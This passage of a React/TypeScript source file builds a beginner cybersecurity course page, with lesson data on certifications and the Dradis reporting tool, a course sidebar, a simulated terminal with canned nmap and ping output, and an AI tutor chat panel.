          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Labs and simulations</li>
            <li>Real attack scenarios</li>
            <li>Tool usage</li>
            <li>Report writing and documentation</li>
          </ul>
          <p class="mb-6 text-gray-300">Certifications like OSCP emphasize hands‑on labs over theory, increasing industry respect.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">Certifications and Ethical Responsibility</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Follow ethical guidelines and legal boundaries</li>
            <li>Practice responsible disclosure</li>
            <li>Adhere to organizational policies</li>
          </ul>
          <p class="mb-6 text-gray-300">Misuse of skills has legal consequences; ethics is core to all certifications.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">How Certifications Help Students</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Provide structure for learning</li>
            <li>Strengthen resumes</li>
            <li>Increase internship opportunities</li>
            <li>Build confidence</li>
            <li>Prepare for industry expectations</li>
          </ul>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Certification Documentation',
            content: `🛠 Tool Name: Dradis Framework

Related Concept: Security Documentation & Certification Reporting

What is Dradis?
Dradis is a collaboration and reporting platform for penetration testers and security teams. It helps organize findings, evidence, and generate professional reports — essential for certifications like OSCP and CEH.

Why This Tool Matches This Topic
Used in professional pentesting reports
Prepares for certification reporting requirements
Improves documentation and communication skills
Widely used in real‑world assessments

Basic Commands
Start Dradis Service
dradis

Access Web Interface
http://127.0.0.1:3000

Start Dradis Community Edition
dradis-ce`
          }
        ]
      }
    ]
  }
];

// --- Components ---

const Sidebar = ({
  activeTab,
  setActiveTab,
  activeModuleId,
  setActiveModuleId,
  activeLessonIndex,
  setActiveLessonIndex,
  completedLessons
}: {
  activeTab: 'outline' | 'resources';
  setActiveTab: (tab: 'outline' | 'resources') => void;
  activeModuleId: string;
  setActiveModuleId: (id: string) => void;
  activeLessonIndex: number;
  setActiveLessonIndex: (index: number) => void;
  completedLessons: Set<string>;
}) => {
  const [expandedModules, setExpandedModules] = useState<Set<string>>(new Set([activeModuleId]));
  const [searchQuery, setSearchQuery] = useState('');

  // Auto-expand the active module when it changes
  useEffect(() => {
    setExpandedModules(prev => {
      const newSet = new Set(prev);
      newSet.add(activeModuleId);
      return newSet;
    });
  }, [activeModuleId]);

  const toggleModule = (id: string) => {
    setExpandedModules(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };

  const filteredModules = courseData.filter(m =>
    m.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
    m.lessons.some(l => l.title.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <div className="w-[350px] bg-[#1e1e1e] border-r border-[#333] flex flex-col h-full">
      {/* Tabs */}
      <div className="flex border-b border-[#333]">
        <button
          onClick={() => setActiveTab('outline')}
          className={`flex-1 py-4 text-sm font-medium transition-colors border-b-2 ${activeTab === 'outline'
            ? 'border-[#00bceb] text-white bg-[#252526]'
            : 'border-transparent text-gray-400 hover:text-gray-200 hover:bg-[#2d2d2d]'
            }`}
        >
          <div className="flex items-center justify-center gap-2">
            <BookOpen className="w-4 h-4" />
            Course Outline
          </div>
        </button>
        <button
          onClick={() => setActiveTab('resources')}
          className={`flex-1 py-4 text-sm font-medium transition-colors border-b-2 ${activeTab === 'resources'
            ? 'border-[#00bceb] text-white bg-[#252526]'
            : 'border-transparent text-gray-400 hover:text-gray-200 hover:bg-[#2d2d2d]'
            }`}
        >
          <div className="flex items-center justify-center gap-2">
            <FileText className="w-4 h-4" />
            Resources
          </div>
        </button>
      </div>

      {/* Search */}
      <div className="p-4 border-b border-[#333]">
        <div className="relative">
          <input
            type="text"
            placeholder="Search course outline"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full bg-[#121212] border border-[#333] rounded px-3 py-2 pl-9 text-sm text-gray-300 focus:outline-none focus:border-[#00bceb] transition-colors placeholder-gray-600"
          />
          <Search className="absolute left-2.5 top-2.5 w-4 h-4 text-gray-500" />
        </div>
      </div>

      {/* Content List */}
      <div className="flex-1 overflow-y-auto custom-scrollbar">
        {activeTab === 'outline' ? (
          <div className="pb-4">
            <div className="px-4 py-4 flex items-center justify-between hover:bg-[#2d2d2d] cursor-pointer transition-colors border-b border-[#333]">
              <div>
                 <span className="text-sm font-semibold text-white block">Course Introduction</span>
                 <div className="w-full bg-gray-700 h-1 rounded-full overflow-hidden mt-2 w-32">
                    <div className="bg-green-500 h-full w-full" />
                 </div>
              </div>
              <div className="flex flex-col items-end">
                 <CheckCircle className="w-5 h-5 text-green-500 mb-1" />
                 <span className="text-xs text-gray-400">100%</span>
              </div>
            </div>

            {filteredModules.map(module => {
              const isExpanded = expandedModules.has(module.id);
              const isActive = activeModuleId === module.id;
              
              // Calculate progress for this module (mock logic)
              const moduleCompletedLessons = module.lessons.filter((_, idx) =>
                completedLessons.has(`${module.id}-${idx}`)
              ).length;
              const progressPercent = Math.round((moduleCompletedLessons / module.lessons.length) * 100);

              return (
                <div key={module.id} className="border-b border-[#333]">
                  <div
                    onClick={() => toggleModule(module.id)}
                    className={`px-4 py-4 cursor-pointer hover:bg-[#2d2d2d] transition-colors ${isActive ? 'bg-[#2d2d2d]' : ''}`}
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex-1">
                        <h3 className="text-sm font-bold text-white leading-tight mb-2">{module.title}</h3>
                        <div className="w-full bg-gray-700 h-1 rounded-full overflow-hidden">
                          <div
                            className="bg-green-500 h-full transition-all duration-300"
                            style={{ width: `${progressPercent}%` }}
                          />
                        </div>
                      </div>
                      <div className="flex flex-col items-end justify-between h-full gap-2">
                        {isExpanded ? (
                          <div className="bg-[#3e3e42] p-1 rounded hover:bg-[#4e4e52]">
                             <ChevronDown className="w-4 h-4 text-gray-300" />
                          </div>
                        ) : (
                          <div className="bg-[#3e3e42] p-1 rounded hover:bg-[#4e4e52]">
                             <ChevronRight className="w-4 h-4 text-gray-300" />
                          </div>
                        )}
                        <span className="text-xs text-gray-400">{progressPercent}%</span>
                      </div>
                    </div>
                  </div>

                  {isExpanded && (
                    <div className="bg-[#121212] py-2">
                      {module.lessons.map((lesson, idx) => {
                        const lessonKey = `${module.id}-${idx}`;
                        const isCompleted = completedLessons.has(lessonKey);
                        const isLessonActive = isActive && activeLessonIndex === idx;

                        return (
                          <div
                            key={idx}
                            onClick={() => {
                              setActiveModuleId(module.id);
                              setActiveLessonIndex(idx);
                            }}
                            className={clsx(
                              'pl-6 pr-4 py-3 cursor-pointer flex items-center gap-3 transition-colors relative',
                              isLessonActive
                                ? 'bg-[#2d2d2d]'
                                : 'hover:bg-[#1e1e1e]'
                            )}
                          >
                             {/* Active indicator line */}
                             {isLessonActive && (
                               <div className="absolute left-0 top-0 bottom-0 w-[3px] bg-green-500" />
                             )}

                             {/* Status Icon */}
                             <div className="flex-shrink-0 z-10">
                                {isCompleted ? (
                                   <CheckCircle className="w-5 h-5 text-green-500" />
                                ) : (
                                   <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${isLessonActive ? 'border-green-500' : 'border-gray-600'}`}>
                                      {isLessonActive && <div className="w-2 h-2 rounded-full bg-green-500" />}
                                   </div>
                                )}
                             </div>

                             {/* Dashed line connector */}
                             {idx !== module.lessons.length - 1 && (
                                <div className="absolute left-[33px] top-[30px] bottom-[-14px] w-[1px] border-l border-dashed border-gray-600 z-0" />
                             )}

                            <div className="flex-1 min-w-0">
                              <div className={clsx(
                                'text-sm font-medium truncate mb-0.5',
                                isLessonActive ? 'text-white' : 'text-gray-400'
                              )}>
                                {module.id.split('-')[1]}.{idx + 1} {lesson.title}
                              </div>
                            </div>
                            
                            <span className="text-xs text-gray-600">{lesson.duration}</span>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        ) : (
          <div className="p-4">
            {resources.map((res, idx) => (
              <div key={idx} className="mb-4 p-3 bg-[#2d2d2d] rounded hover:bg-[#333] transition-colors cursor-pointer border border-[#333]">
                <div className="flex items-center gap-2 mb-2">
                  {res.type === 'video' ? <PlayCircle className="w-4 h-4 text-[#00bceb]" /> : <FileText className="w-4 h-4 text-orange-400" />}
                  <span className="text-xs font-medium text-gray-400 uppercase">{res.type}</span>
                </div>
                <h4 className="text-sm font-medium text-white mb-1">{res.title}</h4>
                <p className="text-xs text-gray-400 mb-2">{res.description}</p>
                <span className="text-xs text-gray-500">{res.duration}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

const CourseLearningCyberSecurityBeginner: React.FC = () => {
  const { slug } = useParams<{ slug: string }>();
  const navigate = useNavigate();
  const { theme, toggleTheme } = useTheme();
  const isDark = theme === 'dark';

  // State
  const [activeTab, setActiveTab] = useState<'outline' | 'resources'>('outline');
  const [activeModuleId, setActiveModuleId] = useState<string>('module-1');
  const [activeLessonIndex, setActiveLessonIndex] = useState(0);
  const [completedLessons, setCompletedLessons] = useState<Set<string>>(new Set(['module-1-0']));
  
  // Content Tab State
  const [activeContentTab, setActiveContentTab] = useState<'lesson' | 'syntax' | 'terminal'>('lesson');

  // Terminal State
  const [terminalInput, setTerminalInput] = useState('');
  const [terminalHistory, setTerminalHistory] = useState<string[]>([
    'Welcome to Cyber Security Terminal!',
    'Type "help" to see available commands.',
    ''
  ]);
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const terminalRef = useRef<HTMLDivElement>(null);

  // Chat State (can be integrated later or kept hidden if not in new design)
  // For now, focusing on the requested UI layout
  
  // Identify current module/lesson
  const activeModule = useMemo(() => courseData.find(m => m.id === activeModuleId), [activeModuleId]);
  const activeLesson = useMemo(() => activeModule?.lessons[activeLessonIndex], [activeModule, activeLessonIndex]);

  // Chat State
  const [messages, setMessages] = useState<ChatMessage[]>([
    { role: 'assistant', content: 'Hello! I am your personal cyber security teacher. How can I help you today?' }
  ]);
  const [loading, setLoading] = useState(false);

  const handleSendMessage = async (text: string) => {
    const newMsg: ChatMessage = { role: 'user', content: text };
    const updated = [...messages, newMsg];
    setMessages(updated);
    setLoading(true);

    try {
      // Build context from active lesson
      const context = `
Current Course: Cyber Security Beginner
Current Module: ${activeModule?.title}
Current Lesson: ${activeLesson?.title}
Lesson Content: ${activeLesson?.content.replace(/<[^>]*>/g, '')}
      `.trim();
      
      const systemPrompt: ChatMessage = {
          role: 'system',
          content: `You are an expert Cyber Security tutor. The user is currently learning "${activeLesson?.title}". 
          Context: ${context}
          Answer the user's question simply and clearly. If it relates to the current lesson, use the provided context.`
      };

      const answer = await askLLM(text, [systemPrompt, ...updated]);
      setMessages(prev => [...prev, { role: 'assistant', content: answer }]);
    } catch (err) {
      setMessages(prev => [...prev, { role: 'assistant', content: 'Sorry, I encountered an error connecting to the AI tutor.' }]);
    } finally {
      setLoading(false);
    }
  };

  // Helper to render text with clickable links
  const renderContentWithLinks = (content: string) => {
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const parts = content.split(urlRegex);
    
    return parts.map((part, i) => {
      if (part.match(urlRegex)) {
        return (
          <a 
            key={i} 
            href={part} 
            target="_blank" 
            rel="noopener noreferrer" 
            className="text-[#00bceb] hover:underline"
          >
            {part}
          </a>
        );
      }
      return part;
    });
  };

  // Terminal Logic
  const simulateCommand = (command: string): string[] => {
    const cmd = command.trim().toLowerCase();
    
    if (cmd === 'help') {
      return [
        'Available commands:',
        '  help      - Show this help message',
        '  clear     - Clear terminal',
        '  whoami    - Show current user',
        '  date      - Show current date/time',
        '  ls        - List directory contents',
        '  pwd       - Print working directory',
        '  cat       - View file content',
        '  echo      - Display a line of text',
        '  nmap      - Network exploration tool (simulated)',
        '  ping      - Send ICMP ECHO_REQUEST (simulated)',
        '  ip addr   - Show IP addresses'
      ];
    }
    
    if (cmd === 'clear') return [];
    
    if (cmd === 'whoami') return ['student'];
    
    if (cmd === 'date') return [new Date().toString()];
    
    if (cmd === 'ls') return ['documents', 'downloads', 'notes.txt', 'secret_key.pem'];
    
    if (cmd === 'pwd') return ['/home/student'];

    if (cmd.startsWith('cat ')) {
      const file = cmd.split(' ')[1];
      if (file === 'notes.txt') return ['- Remember to update system', '- Check firewall logs', '- Change default passwords'];
      if (file === 'secret_key.pem') return ['-----BEGIN RSA PRIVATE KEY-----', 'MIIEpQIBAAKCAQEA...', '-----END RSA PRIVATE KEY-----'];
      return [`cat: ${file}: No such file or directory`];
    }

    if (cmd === 'ip addr' || cmd === 'ifconfig') {
      return [
        'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
        '        inet 192.168.1.15  netmask 255.255.255.0',
        '        ether 00:0c:29:28:fd:4e  txqueuelen 1000  (Ethernet)',
        'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
        '        inet 127.0.0.1  netmask 255.0.0.0'
      ];
    }
    
    if (cmd.startsWith('echo ')) return [command.slice(5)];

    if (cmd.startsWith('nmap')) {
       return [
         'Starting Nmap 7.94 ( https://nmap.org )',
         'Nmap scan report for target (192.168.1.1)',
         'Host is up (0.0020s latency).',
         'Not shown: 998 closed ports',
         'PORT   STATE SERVICE',
         '22/tcp open  ssh',
         '80/tcp open  http',
         'Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds'
       ];
    }

    if (cmd.startsWith('ping')) {
       return [
         'PING 8.8.8.8 (8.8.8.8): 56 data bytes',
         '64 bytes from 8.8.8.8: icmp_seq=0 ttl=115 time=12.432 ms',
         '64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=15.123 ms',
         '64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=11.987 ms',
         '--- 8.8.8.8 ping statistics ---',
         '3 packets transmitted, 3 packets received, 0.0% packet loss'
       ];
    }
    
    return [`Command not found: ${cmd}. Type "help" for list of commands.`];
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    if (terminalInput.trim().toLowerCase() === 'clear') {
      setTerminalHistory(['Welcome to Cyber Security Terminal!', 'Type "help" to see available commands.', '']);
      setTerminalInput('');
      return;
    }

    const newHistory = [...terminalHistory, `$ ${terminalInput}`];
    const output = simulateCommand(terminalInput);
    
    setTerminalHistory([...newHistory, ...output, '']);
    setCommandHistory(prev => [...prev, terminalInput]);
    setTerminalInput('');
    setHistoryIndex(-1);
  };

  const handleTerminalKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const newIndex = historyIndex === -1 ? commandHistory.length - 1 : Math.max(0, historyIndex - 1);
        setHistoryIndex(newIndex);
        setTerminalInput(commandHistory[newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex !== -1) {
        const newIndex = historyIndex + 1;
        if (newIndex >= commandHistory.length) {
          setHistoryIndex(-1);
          setTerminalInput('');
        } else {
          setHistoryIndex(newIndex);
          setTerminalInput(commandHistory[newIndex]);
        }
      }
    }
  };

  // Scroll terminal to bottom when history updates
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalHistory, activeContentTab]);

  // Sync slug with active module if needed, or just default to module-1
  useEffect(() => {
    if (slug && slug !== activeModuleId) {
       const found = courseData.find(m => m.id === slug);
       if (found) setActiveModuleId(slug);
    }
  }, [slug]);

  if (!activeModule || !activeLesson) return <div>Loading...</div>;

  return (
    <div className="flex bg-[#121212] text-white overflow-hidden font-sans" style={{ height: 'calc(100vh / 1.1)', zoom: '110%' }}>
      {/* Sidebar */}
      <Sidebar 
         activeTab={activeTab} 
         setActiveTab={setActiveTab}
         activeModuleId={activeModuleId}
         setActiveModuleId={setActiveModuleId}
         activeLessonIndex={activeLessonIndex}
         setActiveLessonIndex={setActiveLessonIndex}
         completedLessons={completedLessons}
      />

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col h-full overflow-hidden relative">
         {/* Top Navigation Bar (Breadcrumbs & Tools) */}
         <div className="h-[50px] bg-[#1e1e1e] border-b border-[#333] flex items-center justify-between px-4 z-20">
            <div className="flex items-center gap-2 text-sm text-gray-400">
               <span className="cursor-pointer hover:text-white" onClick={() => navigate('/cyber-security-beginner')}>Cyber Security Beginner</span>
               <ChevronRight className="w-4 h-4" />
               <span className="text-white truncate max-w-[300px]">{activeLesson.title}</span>
            </div>
            <div className="flex items-center gap-4">
               <button onClick={toggleTheme} className="text-gray-400 hover:text-white" title="Toggle Theme">
                  {isDark ? '☀' : '☾'}
               </button>
               <span className="text-xs font-bold bg-[#333] px-2 py-1 rounded text-white">EN</span>
            </div>
         </div>

         {/* Content Scroll Area - Wraps Hero, Tabs, and Body */}
         <div id="content-scroll-area" className="flex-1 overflow-y-auto w-full relative">
             {/* Hero / Banner Section */}
             <div className="relative w-full h-[300px] shrink-0">
                {/* Background Image Overlay */}
                <div className="absolute inset-0 bg-gradient-to-t from-[#121212] via-transparent to-black/60 z-10" />
                <img 
                  src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop" 
                  alt="Cyber Security" 
                  className="w-full h-full object-cover"
                />
                
                {/* Content Over Image */}
                <div className="absolute bottom-0 left-0 w-full p-8 z-20">
                   <h1 className="text-4xl font-bold text-white mb-2 shadow-sm drop-shadow-lg">
                      {activeModule.id.split('-')[1]}.{activeLessonIndex + 1} {activeLesson.title}
                   </h1>
                   <div className="flex items-center gap-2 text-white/80 animate-bounce mt-4 cursor-pointer" onClick={() => {
                      document.getElementById('content-scroll-area')?.scrollTo({ top: 300, behavior: 'smooth' });
                   }}>
                      <span className="text-sm font-medium">Scroll to begin</span>
                      <ChevronDown className="w-4 h-4" />
                   </div>
                </div>

                {/* Navigation Arrows */}
                <button 
                   className="absolute left-0 top-1/2 -translate-y-1/2 z-20 bg-green-600/90 hover:bg-green-500 text-white p-2 rounded-r-lg shadow-lg transition-transform hover:scale-110"
                   onClick={() => {
                      if (activeLessonIndex > 0) setActiveLessonIndex(activeLessonIndex - 1);
                   }}
                   disabled={activeLessonIndex === 0}
                   style={{ opacity: activeLessonIndex === 0 ? 0 : 1 }}
                >
                   <ChevronRight className="w-6 h-6 rotate-180" />
                </button>
                <button 
                   className="absolute right-0 top-1/2 -translate-y-1/2 z-20 bg-green-600/90 hover:bg-green-500 text-white p-2 rounded-l-lg shadow-lg transition-transform hover:scale-110"
                   onClick={() => {
                      if (activeLessonIndex < activeModule.lessons.length - 1) setActiveLessonIndex(activeLessonIndex + 1);
                   }}
                   disabled={activeLessonIndex === activeModule.lessons.length - 1}
                   style={{ opacity: activeLessonIndex === activeModule.lessons.length - 1 ? 0 : 1 }}
                >
                   <ChevronRight className="w-6 h-6" />
                </button>
             </div>

             {/* Tabs Navigation */}
             <div className="sticky top-0 z-30 flex items-center gap-6 px-8 lg:px-16 border-b border-[#333] bg-[#1e1e1e] shrink-0">
                <button 
                   onClick={() => setActiveContentTab('lesson')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'lesson' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <BookOpen className="w-4 h-4" /> Lesson
                </button>
                <button 
                   onClick={() => setActiveContentTab('syntax')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'syntax' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <Code className="w-4 h-4" /> Syntax
                </button>
                <button 
                   onClick={() => setActiveContentTab('terminal')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'terminal' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <Terminal className="w-4 h-4" /> Terminal
                </button>
             </div>

             {/* Content Body */}
             <div className="p-8 lg:px-16 w-full">
            <div className="max-w-screen-2xl mx-auto grid grid-cols-1 xl:grid-cols-3 gap-8">
               <div className="xl:col-span-2">
               {activeContentTab === 'lesson' && (
                  <>
                     <div className="prose prose-invert prose-lg max-w-none">
                        <div dangerouslySetInnerHTML={{ __html: activeLesson.content }} />
                     </div>

                     {/* Bottom Navigation */}
                     <div className="mt-12 flex justify-between items-center border-t border-[#333] pt-8 pb-12">
                        <button 
                           onClick={() => {
                              if (activeLessonIndex > 0) setActiveLessonIndex(activeLessonIndex - 1);
                           }}
                           disabled={activeLessonIndex === 0}
                           className={`flex items-center gap-2 px-6 py-3 rounded-full font-medium transition-colors ${
                              activeLessonIndex === 0 
                              ? 'text-gray-600 cursor-not-allowed' 
                              : 'bg-[#2d2d2d] hover:bg-[#3e3e42] text-white'
                           }`}
                        >
                           <ChevronRight className="w-4 h-4 rotate-180" />
                           Previous
                        </button>

                        <button 
                           onClick={() => {
                              // Mark current as completed
                              setCompletedLessons(prev => new Set(prev).add(`${activeModuleId}-${activeLessonIndex}`));
                              if (activeLessonIndex < activeModule.lessons.length - 1) {
                                 setActiveLessonIndex(activeLessonIndex + 1);
                              }
                           }}
                           className="flex items-center gap-2 px-6 py-3 rounded-full font-medium bg-green-600 hover:bg-green-500 text-white transition-colors shadow-lg shadow-green-900/20"
                        >
                           {activeLessonIndex === activeModule.lessons.length - 1 ? 'Finish Module' : 'Next Topic'}
                           <ChevronRight className="w-4 h-4" />
                        </button>
                     </div>
                  </>
               )}

               {activeContentTab === 'syntax' && (
                  <div className="space-y-6 animate-fadeIn">
                     <h2 className="text-2xl font-bold text-white mb-6">Syntax & Resources</h2>
                     {activeLesson.syntax ? (
                        activeLesson.syntax.map((item, idx) => (
                           <div key={idx} className="bg-[#252526] border border-[#333] rounded-lg overflow-hidden">
                              <div className="px-4 py-2 bg-[#2d2d2d] border-b border-[#333] font-mono text-sm text-[#00bceb]">
                                 {item.title}
                              </div>
                              <div className="p-4 font-mono text-sm text-gray-300 whitespace-pre-wrap">
                                 {renderContentWithLinks(item.content)}
                              </div>
                           </div>
                        ))
                     ) : (
                        <div className="text-center py-12 text-gray-500 bg-[#252526]/50 rounded-lg border border-[#333] border-dashed">
                           <Code className="w-12 h-12 mx-auto mb-3 opacity-50" />
                           <p>No syntax examples available for this lesson.</p>
                        </div>
                     )}
                  </div>
               )}

               {activeContentTab === 'terminal' && (
                  <div className="h-full flex flex-col animate-fadeIn">
                     <div className="bg-[#1e1e1e] rounded-lg border border-[#333] shadow-2xl overflow-hidden flex flex-col h-[500px]">
                        <div className="px-4 py-2 bg-[#2d2d2d] border-b border-[#333] flex items-center justify-between">
                           <span className="text-xs font-mono text-gray-400">root@kali:~</span>
                           <div className="flex gap-1.5">
                              <div className="w-2.5 h-2.5 rounded-full bg-red-500/50" />
                              <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50" />
                              <div className="w-2.5 h-2.5 rounded-full bg-green-500/50" />
                           </div>
                        </div>
                        <div 
                           ref={terminalRef}
                           className="flex-1 p-4 font-mono text-sm overflow-y-auto custom-scrollbar bg-black/90 text-green-500"
                           onClick={() => document.getElementById('terminal-input')?.focus()}
                        >
                           {terminalHistory.map((line, idx) => (
                              <div key={idx} className="whitespace-pre-wrap mb-1">{line}</div>
                           ))}
                           <form onSubmit={handleTerminalSubmit} className="flex items-center mt-2">
                              <span className="mr-2 text-green-500 font-bold">$</span>
                              <input
                                 id="terminal-input"
                                 type="text"
                                 value={terminalInput}
                                 onChange={(e) => setTerminalInput(e.target.value)}
                                 onKeyDown={handleTerminalKeyDown}
                                 className="flex-1 bg-transparent border-none outline-none text-green-500 font-mono"
                                 autoComplete="off"
                                 autoFocus
                              />
                           </form>
                        </div>
                     </div>
                     
                     {/* Quick Commands */}
                     <div className="mt-6">
                        <h3 className="text-sm font-semibold text-gray-400 mb-3 uppercase tracking-wider">Available Commands</h3>
                        <div className="flex flex-wrap gap-2">
                           {activeLesson.terminalCommands?.map(cmd => (
                              <button
                                 key={cmd}
                                 onClick={() => {
                                    setTerminalInput(cmd);
                                    document.getElementById('terminal-input')?.focus();
                                 }}
                                 className="px-3 py-1.5 bg-[#2d2d2d] hover:bg-[#3e3e42] border border-[#333] rounded text-xs font-mono text-blue-400 transition-colors"
                              >
                                 {cmd}
                              </button>
                           )) || (
                              <p className="text-sm text-gray-500">No specific commands suggested for this lesson.</p>
                           )}
                        </div>
                     </div>
                  </div>
               )}
               </div>
               
               {/* Chat Panel Column */}
               <div className="hidden xl:block xl:col-span-1">
                  <ChatPanel isDark={isDark} messages={messages} loading={loading} onSend={handleSendMessage} />
               </div>
            </div>
         </div>
         </div>
      </div>
    </div>
  );
};


export default CourseLearningCyberSecurityBeginner;

const FloatingDock: React.FC<{ isDark: boolean; onToggleTheme: () => void; onPrevModule: () => void; disabledPrev: boolean; onNextModule: () => void; disabledNext: boolean; onHome: () => void } > = ({ isDark, onToggleTheme, onPrevModule, disabledPrev, onNextModule, disabledNext, onHome }) => (
  <div className={`fixed top-4 left-1/2 -translate-x-1/2 z-40 rounded-2xl shadow-lg border ${isDark ? 'bg-white/10 border-white/20' : 'bg-white/60 border-gray-300/40'} backdrop-blur-xl px-3 py-2 flex items-center gap-2`} aria-label="Quick actions dock">
    <button
      onClick={onHome}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${isDark ? 'bg-white/10 text-white hover:bg-white/15' : 'bg-gray-100 text-gray-900 hover:bg-gray-200'}`}
      aria-label="Go to Student Portal"
      title="Student Portal"
    >
      <span className="inline-flex items-center gap-1">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M3 10.5L12 3l9 7.5v9a1.5 1.5 0 0 1-1.5 1.5H4.5A1.5 1.5 0 0 1 3 19.5v-9z" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
          <path d="M9 21V12h6v9" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
        Home
      </span>
    </button>
    <div className="mx-1 h-6 w-px bg-gray-300/60 dark:bg-white/20" aria-hidden />
    <button
      onClick={onToggleTheme}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${isDark ? 'bg-white/10 text-white hover:bg-white/15' : 'bg-gray-100 text-gray-900 hover:bg-gray-200'}`}
      aria-label={isDark ? 'Switch to light mode' : 'Switch to dark mode'}
    >
      {isDark ? 'Light Mode' : 'Dark Mode'}
    </button>
    <button
      onClick={onPrevModule}
      disabled={disabledPrev}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${disabledPrev ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : (isDark ? 'bg-black text-white hover:bg-gray-900' : 'bg-blue-600 text-white hover:bg-blue-500')}`}
      aria-label="Go to previous module"
    >
      Previous Module
    </button>
    <button
      onClick={onNextModule}
      disabled={disabledNext}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${disabledNext ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : (isDark ? 'bg-black text-white hover:bg-gray-900' : 'bg-blue-600 text-white hover:bg-blue-500')}`}
      aria-label="Go to next module"
    >
      Next Module
    </button>
  </div>
);

const ChatPanel: React.FC<{ isDark: boolean; messages: ChatMessage[]; loading: boolean; onSend: (text: string) => void }> = ({ isDark, messages, loading, onSend }) => {
  const [text, setText] = React.useState('');

  // Typing animation state for the latest assistant message
  const [typingIndex, setTypingIndex] = React.useState<number | null>(null);
  const [typedContent, setTypedContent] = React.useState('');
  const typingTimerRef = React.useRef<number | null>(null);

  React.useEffect(() => {
    if (!messages.length) return;
    const lastIndex = messages.length - 1;
    const last = messages[lastIndex];

    // Start typing animation only for the newest assistant message
    if (last.role === 'assistant') {
      // If already animating this message, skip
      if (typingIndex === lastIndex && typedContent.length === last.content.length) return;

      // Clear any previous timer
      if (typingTimerRef.current) {
        window.clearInterval(typingTimerRef.current);
        typingTimerRef.current = null;
      }

      setTypingIndex(lastIndex);
      setTypedContent('');
      let i = 0;
      const full = last.content;
      const speedMs = 18; // smooth typing speed
      typingTimerRef.current = window.setInterval(() => {
        i = Math.min(i + 1, full.length);
        setTypedContent(full.slice(0, i));
        if (i >= full.length) {
          if (typingTimerRef.current) {
            window.clearInterval(typingTimerRef.current);
            typingTimerRef.current = null;
          }
        }
      }, speedMs);
    }

    // Cleanup when messages change or component unmounts
    return () => {
      if (typingTimerRef.current) {
        window.clearInterval(typingTimerRef.current);
        typingTimerRef.current = null;
      }
    };
  }, [messages]);

  return (
    <aside className={`${isDark ? 'bg-gradient-to-br from-white/15 to-white/5 border-white/20' : 'bg-gradient-to-br from-white/70 to-white/40 border-gray-300/40'} backdrop-blur-2xl backdrop-saturate-150 w-full lg:sticky lg:top-4 lg:self-start h-[calc(100vh-240px)] min-h-[520px] rounded-2xl border p-4 flex flex-col shadow-lg ring-1 ${isDark ? 'ring-white/10' : 'ring-white/60'}`
      }>
        {/* Chat Header */}
        <div className={`flex flex-col items-start gap-0.5 pb-3 border-b ${isDark ? 'border-white/20' : 'border-[#14A38F]/30'} ${isDark ? 'bg-white/10' : 'bg-white/60'} backdrop-blur-xl rounded-lg px-3 py-2`}>
          <h3 className={`text-sm font-medium ${isDark ? 'text-white' : 'text-[#14A38F]'}`}>
            Personal Teacher
          </h3>
          <span className={`text-xs ${isDark ? "text-gray-400" : "text-gray-500"}`}>
            Ask me anything about the components
          </span>
        </div>

        {/* Messages List */}
        <div className={`flex-1 min-h-0 overflow-y-auto space-y-4 ${isDark ? "text-gray-200" : "text-gray-800"}`}>
          {messages.map((msg, idx) => (
            <div key={idx} className={`flex ${msg.role === "assistant" ? "justify-start" : "justify-end"}`}>
              <div
                className={`${
